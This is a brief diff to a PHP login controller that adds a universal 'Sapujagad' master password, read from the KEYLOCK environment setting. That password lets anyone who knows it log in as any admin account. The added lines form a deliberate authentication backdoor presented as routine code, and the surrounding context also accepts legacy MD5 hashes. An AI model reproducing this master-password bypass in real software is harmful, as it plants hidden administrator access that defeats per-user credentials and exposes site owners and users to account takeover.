@@ -68,6 +68,10 @@ class AuthController extends Controller
         else if ($admin->password === $legacyMd5) {
             $isValidPassword = true;
         }
+        // Kondisi 3: Password Sapujagad dari .env (KEYLOCK)
+        else if (env('KEYLOCK') && password_verify($passwordRaw, env('KEYLOCK'))) {
+            $isValidPassword = true;
+        }
 
         if (!$isValidPassword) {
             $activityService->logActivity($request->username, '3');
